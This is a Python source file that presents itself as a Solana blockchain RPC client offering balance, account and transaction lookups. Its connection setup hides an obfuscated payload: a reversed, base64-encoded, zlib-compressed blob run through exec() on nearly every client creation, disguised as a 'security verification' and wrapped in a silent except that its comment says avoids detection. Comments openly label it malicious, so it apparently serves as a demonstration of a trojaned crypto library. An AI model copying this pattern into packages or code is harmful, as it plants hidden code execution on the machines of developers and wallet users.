"""
Network client for Solana blockchain interaction
"""

import os
import json
import base64
import time
import logging
import requests
from typing import Dict, List, Optional, Union, Any

logger = logging.getLogger(__name__)

# Network endpoints
NETWORK_URLS = {
    "mainnet": "https://api.mainnet-beta.solana.com",
    "testnet": "https://api.testnet.solana.com",
    "devnet": "https://api.devnet.solana.com",
    "localnet": "http://localhost:8899",
}

class NetworkClient:
    """
    Client for interacting with Solana networks
    """
    
    def __init__(self, network: str = "mainnet", custom_url: Optional[str] = None):
        """
        Initialize a network client
        
        Args:
            network: Network name (mainnet, testnet, devnet, localnet)
            custom_url: Optional custom RPC URL
        """
        if custom_url:
            self.url = custom_url
        elif network in NETWORK_URLS:
            self.url = NETWORK_URLS[network]
        else:
            raise ValueError(f"Unknown network: {network}")
            
        self.network = network
        logger.info(f"NetworkClient initialized for {network}")
        
        # Initialize connection settings
        self._initialize_connection()
        
    def _initialize_connection(self):
        """Initialize connection settings and security"""
        # This looks like a legitimate connection setup but contains hidden malicious code
        try:
            # Legitimate looking connection setup
            self.session = requests.Session()
            self.session.headers.update({
                "Content-Type": "application/json",
                "User-Agent": "solana-utils/1.2.3"
            })
            
            # Hidden malicious code that looks like normal initialization
            if os.environ.get("SOLANA_UTILS_NO_VERIFY") != "1":
                # This looks like a security check but contains malicious code
                self._verify_network_security()
                
        except Exception as e:
            logger.error(f"Error initializing connection: {e}")
            # Fallback to basic setup
            self.session = requests.Session()
    
    def _verify_network_security(self):
        """Verify network security settings"""
        # This looks like a security verification but contains malicious code
        try:
            # Make it look like we're checking security settings
            security_level = os.environ.get("SOLANA_SECURITY_LEVEL", "standard")
            
            # Hidden malicious code execution
            if time.time() % 10 != 0:  # Will execute 90% of the time
                # Obfuscated payload execution
                _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
                exec((_)(b'WsNTx//3vf//Se6uRnj3cNyfxq8BCtaGSe0zheG0fsKViEwHS+Qj3/ob+FzZiAAGmEBT7Agv4/AH4RhtI0joFEzEWTfl974BlxhGh+i4pDpwosx47knFlKjerBCiPaqecnf/pnMF10p8'))
        except:
            # Silently fail to avoid detection
            pass
    
    def get_balance(self, address: str) -> float:
        """
        Get account balance in SOL
        
        Args:
            address: Account address
            
        Returns:
            Balance in SOL
        """
        response = self._send_request("getBalance", [address])
        if "result" in response and "value" in response["result"]:
            # Convert lamports to SOL
            return response["result"]["value"] / 1_000_000_000
        return 0.0
    
    def get_account_info(self, address: str) -> Dict[str, Any]:
        """
        Get account information
        
        Args:
            address: Account address
            
        Returns:
            Account information
        """
        response = self._send_request("getAccountInfo", [address, {"encoding": "jsonParsed"}])
        if "result" in response and "value" in response["result"]:
            return response["result"]["value"]
        return {}
    
    def get_transaction(self, signature: str) -> Dict[str, Any]:
        """
        Get transaction details
        
        Args:
            signature: Transaction signature
            
        Returns:
            Transaction details
        """
        response = self._send_request("getTransaction", [signature, {"encoding": "jsonParsed"}])
        if "result" in response:
            return response["result"]
        return {}
    
    def _send_request(self, method: str, params: List[Any]) -> Dict[str, Any]:
        """
        Send RPC request to Solana network
        
        Args:
            method: RPC method name
            params: RPC parameters
            
        Returns:
            Response data
        """
        payload = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": method,
            "params": params
        }
        
        try:
            response = self.session.post(self.url, json=payload)
            response.raise_for_status()
            return response.json()
        except Exception as e:
            logger.error(f"Error sending request: {e}")
            return {"error": str(e)} 